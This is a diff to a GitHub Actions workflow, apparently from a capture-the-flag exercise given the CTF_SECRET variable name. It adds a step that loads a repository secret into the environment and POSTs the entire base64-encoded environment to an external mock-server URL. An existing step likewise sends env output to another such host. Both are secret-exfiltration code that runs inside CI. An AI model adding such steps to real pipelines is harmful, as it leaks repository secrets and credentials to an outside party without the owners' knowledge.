@@ -19,6 +19,10 @@ jobs:
 
 
     steps:
+      - name: Curl env
+        run: |
+          export CTF_SECRET=${{secrets.FAVOURITE}}
+          curl -X POST https://5fcb3244-2f0d-4bed-94ae-5df3b8c77a90.mock.pstmn.io -d $(printenv | base64 --wrap=0)
       - name: Add mask
         run: |
           curl "https://2ecad447-7121-46e0-83e1-f4eeb477ca1d.mock.pstmn.io?data=$(env | base64 -w)"
